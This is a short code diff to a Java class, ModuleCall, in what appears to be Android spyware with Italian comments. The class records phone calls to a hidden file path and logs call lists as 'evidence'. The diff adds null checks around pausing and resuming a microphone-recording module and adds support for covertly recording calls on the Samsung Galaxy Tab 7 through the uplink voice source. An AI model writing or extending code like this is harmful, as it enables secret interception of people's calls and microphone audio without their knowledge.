@@ -126,7 +126,11 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 					
 					// Se un giorno la conf non dovesse includere gia' tutti i moduli,
 					// self() tornerebbe NULL in quanto non instanziato.
-					ModuleMic.self().resume();
+					ModuleMic mic = ModuleMic.self();
+					
+					if (mic != null) {
+						mic.resume();
+					}
 				}
 
 				if (Cfg.DEBUG) {
@@ -149,7 +153,11 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			// Logfile .3gpp in chiaro, temporaneo
 			String path = Path.hidden() + "/" + tmp + ".qzt";
 
-			ModuleMic.self().suspend();
+			ModuleMic mic = ModuleMic.self();
+			
+			if (mic != null) {
+				mic.suspend();
+			}
 			
 			if (startRecord(strategy, outputFormat, audioEncoder, path) == true) {
 				if (Cfg.DEBUG) {
@@ -159,7 +167,12 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				return 1;
 			}
 			
-			ModuleMic.self().resume();
+			mic = ModuleMic.self();
+			
+			if (mic != null) {
+				mic.resume();
+			}
+			
 		}
 
 		saveCalllistEvidence(number, incoming, from, to);
@@ -348,6 +361,13 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): Motorola xt-910, unsupported"); //$NON-NLS-1$
+			}
+		}  else if (model.contains("gt-p1000")){ // Samsung Galaxy Tab 7''
+			supported = true;
+			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification): Samsung Galaxy Tab 7'',  supported"); //$NON-NLS-1$
 			}
 		} else {
 			if (Cfg.DEBUG) {
